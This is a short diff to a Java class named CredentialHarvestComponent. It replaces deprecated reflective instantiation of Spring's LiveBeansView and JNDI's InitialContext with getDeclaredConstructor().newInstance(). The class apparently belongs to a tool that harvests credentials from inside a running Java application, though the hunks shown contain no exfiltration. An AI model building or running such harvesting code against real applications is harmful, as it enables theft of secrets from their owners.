@@ -499,7 +499,8 @@ public class CredentialHarvestComponent implements Runnable {
         // 方式2：通过 LiveBeansView.applicationContexts
         try {
             Set appContexts = (Set) getFieldValue(
-                    cl.loadClass("org.springframework.context.support.LiveBeansView").newInstance(),
+                    cl.loadClass("org.springframework.context.support.LiveBeansView")
+                            .getDeclaredConstructor().newInstance(),
                     "applicationContexts");
             if (appContexts != null && !appContexts.isEmpty()) {
                 return appContexts.iterator().next();
@@ -608,7 +609,8 @@ public class CredentialHarvestComponent implements Runnable {
      */
     private Object newInitialContext() {
         try {
-            return Class.forName("javax.naming.InitialContext").newInstance();
+            return Class.forName("javax.naming.InitialContext")
+                    .getDeclaredConstructor().newInstance();
         } catch (Exception e) {
             return null;
         }
